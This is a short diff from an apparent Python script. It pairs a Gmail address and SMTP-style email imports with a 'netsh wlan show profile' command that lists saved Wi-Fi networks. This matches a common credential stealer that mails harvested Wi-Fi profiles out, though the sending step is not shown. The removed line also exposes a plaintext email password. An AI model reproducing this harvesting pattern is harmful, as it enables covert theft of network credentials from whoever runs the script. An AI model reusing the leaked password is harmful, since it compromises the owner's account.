@@ -5,7 +5,7 @@ import time
 from email.mime.text import MIMEText
 
 my_email = "nans2502@gmail.com"
-password = "SUPERdouna25"
+password = ""
 
 command = "netsh wlan show profile"
 networks = subprocess.check_output(command, shell=True) #output de la commande, qui contient les noms des wireless outspots, type bytes
